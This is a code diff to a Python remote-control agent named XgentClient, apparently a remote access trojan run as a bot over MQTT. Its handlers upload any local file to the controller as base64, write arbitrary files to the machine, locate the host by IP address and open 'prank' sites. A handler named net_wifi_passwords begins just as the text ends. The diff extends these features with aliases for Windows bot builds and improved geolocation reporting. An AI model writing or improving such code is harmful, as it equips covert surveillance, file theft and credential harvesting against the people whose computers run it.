@@ -9,6 +9,7 @@ import json
 import logging
 import os
 import random
+import shutil
 import socket
 import subprocess
 import sys
@@ -230,6 +231,7 @@ class XgentClient:
             target=self._heartbeat_loop, name="xgent-heartbeat", daemon=True
         )
         self._standby = False
+        self._command_context = threading.local()
         self._handlers = {
             "open_url": self._do_open_url,
             "notify": self._do_notify,
@@ -456,6 +458,7 @@ class XgentClient:
 
     def _run_threaded(self, action, cmd_id, func, payload) -> None:
         def _worker() -> None:
+            self._command_context.cmd_id = cmd_id
             try:
                 func(payload)
             except Exception:
@@ -463,6 +466,11 @@ class XgentClient:
                 self._publish_ack(action, "error", detail="exception", cmd_id=cmd_id)
             else:
                 self._publish_ack(action, "ok", cmd_id=cmd_id)
+            finally:
+                try:
+                    del self._command_context.cmd_id
+                except AttributeError:
+                    pass
         threading.Thread(target=_worker, name=f"xgent-cmd-{action}", daemon=True).start()
 
     def _publish_status(self) -> None:
@@ -476,6 +484,9 @@ class XgentClient:
         self._client.publish(f"{MQTT_PREFIX}/{DEVICE_ID}/status", json.dumps(envelope, ensure_ascii=False), qos=0)
 
     def _publish_response(self, topic_suffix: str, payload: dict) -> None:
+        cmd_id = getattr(self._command_context, "cmd_id", None)
+        if cmd_id is not None and "id" not in payload:
+            payload = {**payload, "id": cmd_id}
         body = encrypt_payload(payload) if ENCRYPT_PAYLOAD else payload
         envelope = sign_message(body)
         info = self._client.publish(
@@ -912,16 +923,23 @@ class XgentClient:
                 return
             with open(path, "rb") as f:
                 data = base64.b64encode(f.read()).decode("ascii")
-            self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID, "ok": True, "path": path, "filename": os.path.basename(path), "data": data})
+            self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID, "ok": True,
+                                                "path": path, "filename": os.path.basename(path), "data": data,
+                                                # Aliases for older Windows bot builds.
+                                                "name": os.path.basename(path), "b64": data})
         except Exception as exc:
             self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID, "ok": False, "error": str(exc)})
 
     def _do_file_put(self, payload: dict) -> None:
         path = os.path.expanduser((payload.get("path") or "").strip())
+        if not path:
+            name = os.path.basename((payload.get("name") or "file.bin").strip())
+            base = os.path.expanduser((payload.get("dir") or "~").strip())
+            path = os.path.join(base, name)
         try:
             os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
             with open(path, "wb") as f:
-                f.write(base64.b64decode(payload.get("data") or ""))
+                f.write(base64.b64decode(payload.get("data") or payload.get("b64") or ""))
             self._publish_response("file_put", {"type": "file_put", "device_id": DEVICE_ID, "ok": True, "path": path})
         except Exception as exc:
             self._publish_response("file_put", {"type": "file_put", "device_id": DEVICE_ID, "ok": False, "error": str(exc)})
@@ -974,27 +992,32 @@ class XgentClient:
         """Получить приблизительную геолокацию по IP."""
         import urllib.request
         try:
-            req = urllib.request.Request("http://ip-api.com/json/", headers={'User-Agent': 'Mozilla/5.0'})
+            req = urllib.request.Request("https://ipapi.co/json/", headers={'User-Agent': 'XIDER-Agent/3'})
             with urllib.request.urlopen(req, timeout=10) as response:
                 data = json.loads(response.read().decode())
-                
-            if data.get("status") == "success":
+            if not data.get("error") and (data.get("ip") or data.get("city")):
                 info = (f"📍 <b>Геолокация macOS (по IP):</b>\n"
-                        f"🌍 Страна: {data.get('country')}\n"
-                        f"🏙 Город: {data.get('city')}\n"
-                        f"📡 Провайдер: {data.get('isp')}\n"
-                        f"🗺 Координаты: {data.get('lat')}, {data.get('lon')}\n"
-                        f"💻 IP: {data.get('query')}")
+                        f"🌍 Страна: {data.get('country_name') or data.get('country')}\n"
+                        f"🏙 Город: {data.get('city') or '?'}\n"
+                        f"📡 Провайдер: {data.get('org') or '?'}\n"
+                        f"🗺 Координаты: {data.get('latitude')}, {data.get('longitude')}\n"
+                        f"💻 IP: {data.get('ip') or '?'}")
+                ok = True
             else:
                 info = "⚠️ Не удалось определить локацию."
+                ok = False
         except Exception as exc:
             info = f"❌ Ошибка геолокации: {exc}"
+            ok = False
             
         self._publish_response("geo_location", {
             "type": "geo_location",
             "device_id": DEVICE_ID,
-            "ok": True,
+            "ok": ok,
             "text": info,
+        })
+        self._publish_response("output", {
+            "type": "geo_location", "device_id": DEVICE_ID, "ok": ok, "text": info,
         })
 
     def _do_wallpaper_set(self, payload: dict) -> None:
@@ -1196,14 +1219,28 @@ class XgentClient:
         self._publish_response("prank_random_site", {"type": "prank_random_site", "device_id": DEVICE_ID, "ok": True, "url": site})
 
     def _do_display_brightness(self, payload: dict) -> None:
-        lvl = payload.get("level", 50)
-        self._publish_response("display_brightness", {"type": "display_brightness", "device_id": DEVICE_ID, "ok": True, "level": lvl})
+        lvl = max(0, min(100, int(payload.get("level", 50))))
+        if not shutil.which("brightness"):
+            text = "⚠️ На macOS нет команды brightness. Установите её (brew install brightness) или используйте системный ползунок."
+            ok = False
+        else:
+            try:
+                subprocess.run(["brightness", str(lvl / 100)], check=True, timeout=8)
+                text, ok = f"🔆 Яркость установлена на {lvl}%", True
+            except Exception as exc:
+                text, ok = f"⚠️ Не удалось изменить яркость: {exc}", False
+        self._publish_response("display_brightness", {"type": "display_brightness", "device_id": DEVICE_ID, "ok": ok, "level": lvl, "text": text})
+        self._publish_response("output", {"type": "display_brightness", "device_id": DEVICE_ID, "ok": ok, "text": text})
 
     def _do_display_night_light(self, payload: dict) -> None:
-        self._publish_response("display_night_light", {"type": "display_night_light", "device_id": DEVICE_ID, "ok": True})
+        text = "⚠️ Ночной свет macOS не имеет стабильного публичного CLI в агенте; переключите его в Пункте управления."
+        self._publish_response("display_night_light", {"type": "display_night_light", "device_id": DEVICE_ID, "ok": False, "text": text})
+        self._publish_response("output", {"type": "display_night_light", "device_id": DEVICE_ID, "ok": False, "text": text})
 
     def _do_display_rotate(self, payload: dict) -> None:
-        self._publish_response("display_rotate", {"type": "display_rotate", "device_id": DEVICE_ID, "ok": True})
+        text = "⚠️ Поворот экрана macOS не поддерживается безопасным системным API агента."
+        self._publish_response("display_rotate", {"type": "display_rotate", "device_id": DEVICE_ID, "ok": False, "text": text, "angle": payload.get("angle", 0)})
+        self._publish_response("output", {"type": "display_rotate", "device_id": DEVICE_ID, "ok": False, "text": text})
 
     def _do_net_wifi_passwords(self, payload: dict) -> None:
         try:
